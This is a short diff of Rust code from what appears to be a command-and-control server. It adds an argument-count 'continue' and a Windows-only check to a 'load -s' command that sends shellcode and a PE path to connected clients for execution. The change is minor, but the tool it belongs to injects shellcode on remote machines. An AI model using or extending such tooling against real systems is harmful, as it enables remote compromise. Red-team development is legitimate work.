@@ -238,7 +238,12 @@ pub fn server(i: &str, port: u16, cert_path: &str, cert_pass: &str) -> Result<()
                                 let path: Vec<&str> = cmd.split(' ').collect();
                                 if path.len() != 4 {
                                     log::warn!("Invalid argument number. Usage is : load -s C:\\path\\to\\shellcode.bin C:\\path\\to\\PE_to_execute\0");
+                                    continue;
                                 } else {
+                                    if _client_os.ne("windows") {
+                                        log::warn!("Client's OS is not Windows, this command doesn't make any sense");
+                                        continue;
+                                    }
                                     match File::open(path[2]) {
                                         Ok(file) => {
                                             match stream.write(cmd.as_bytes()) {
